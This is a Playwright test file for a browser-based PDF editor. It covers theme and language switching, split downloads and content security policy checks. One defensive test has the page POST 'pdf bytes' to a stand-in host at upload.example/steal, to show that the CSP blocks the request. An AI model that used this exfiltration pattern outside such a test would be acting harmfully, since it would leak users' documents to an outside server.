import { expect, test as base } from '@playwright/test';
import { unzipSync } from 'fflate';
import { readFile } from 'node:fs/promises';
import { openFixtures, downloadBytes, test } from './helpers';

test.describe('languages', () => {
  test('follows the system theme, lets the visitor switch and keeps the choice', async ({ app: page }) => {
    const paper = () => page.evaluate(() => getComputedStyle(document.body).backgroundColor);
    await page.emulateMedia({ colorScheme: 'dark' });
    expect(await paper()).toBe('rgb(14, 15, 18)');

    await page.getByRole('button', { name: 'Heller Modus' }).click();
    await expect(page.locator('html')).toHaveAttribute('data-theme', 'light');
    expect(await paper()).toBe('rgb(255, 255, 255)');

    await page.reload();
    await expect(page.locator('html')).toHaveAttribute('data-theme', 'light');
    await page.getByRole('button', { name: 'Dunkler Modus' }).click();
    await expect(page.locator('html')).toHaveAttribute('data-theme', 'dark');
    expect(await paper()).toBe('rgb(14, 15, 18)');
  });

  test('switches to English, keeps the choice and names downloads in English', async ({ app: page }) => {
    await page.getByRole('button', { name: 'English' }).click();
    await expect(page.getByText('Nothing is uploaded')).toBeVisible();
    await expect(page.locator('html')).toHaveAttribute('lang', 'en');
    await expect(page).toHaveTitle(/edit PDFs without uploading/);

    await page.reload();
    await expect(page.getByRole('button', { name: 'Choose PDF' })).toBeVisible();

    await openFixtures(page);
    await expect(page.getByText('5 pages from 2 files')).toBeVisible();
    await page.getByRole('button', { name: 'Split', exact: false }).first().click();
    await page.getByRole('textbox', { name: 'Page ranges' }).fill('9');
    await page.getByRole('button', { name: 'Split & download' }).click();
    await expect(page.getByRole('alert')).toContainText('“9” is outside 1–5.');
    await page.getByRole('textbox', { name: 'Page ranges' }).fill('1-2, 3-');

    const download = page.waitForEvent('download');
    await page.getByRole('button', { name: 'Split & download' }).click();
    const file = await download;
    expect(file.suggestedFilename()).toBe('merged-split.zip');
    expect(Object.keys(unzipSync(await downloadBytes(file)))).toEqual(['merged-01_p1-2.pdf', 'merged-02_p3-5.pdf']);

    await page.getByRole('button', { name: 'Deutsch' }).click();
    await expect(page.getByText('5 Seiten aus 2 Dateien')).toBeVisible();
  });

  test.describe('with an English browser', () => {
    test.use({ locale: 'en-US' });

    test('starts in English', async ({ app: page }) => {
      await expect(page.getByText('Nothing is uploaded')).toBeVisible();
      await expect(page.locator('html')).toHaveAttribute('lang', 'en');
    });
  });

  test.describe('with a browser in another language', () => {
    test.use({ locale: 'fr-FR' });

    test('falls back to English', async ({ app: page }) => {
      await expect(page.getByRole('button', { name: 'Choose PDF' })).toBeVisible();
    });
  });
});

// These tests provoke a blocked request on purpose, so they do not use the `app` fixture.
base.describe('content security policy', () => {
  base('is part of the page and allows connections to the own origin only', async ({ page }) => {
    await page.goto('/');
    const csp = await page.locator('meta[http-equiv="Content-Security-Policy"]').getAttribute('content');
    expect(csp).toContain("default-src 'none'");
    expect(csp).toContain("connect-src 'self'");
    expect(csp).not.toContain('unsafe-inline');
    expect(csp).not.toMatch(/'unsafe-eval'/);

    // The headers file for the host carries the same policy and the usual hardening headers.
    const headers = await readFile(new URL('../../dist/_headers', import.meta.url), 'utf8');
    expect(headers).toContain(`Content-Security-Policy: ${csp}; frame-ancestors 'none'`);
    expect(headers).toContain('X-Content-Type-Options: nosniff');
    expect(headers).toContain('Referrer-Policy: no-referrer');
  });

  base('makes the browser itself refuse to send data to another server', async ({ page, context }) => {
    // Should the policy ever fail, the request still must not reach the internet.
    let reachedNetwork = false;
    await context.route('https://upload.example/**', (route) => {
      reachedNetwork = true;
      return route.abort();
    });
    await page.goto('/');
    const result = await page.evaluate(async () => {
      const violation = new Promise<string>((resolve) =>
        document.addEventListener('securitypolicyviolation', (e) => resolve(e.effectiveDirective), { once: true }),
      );
      const sent = await fetch('https://upload.example/steal', { method: 'POST', body: 'pdf bytes' }).then(
        () => true,
        () => false,
      );
      return { sent, directive: await violation };
    });
    expect(result).toEqual({ sent: false, directive: 'connect-src' });
    expect(reachedNetwork).toBe(false);
  });
});
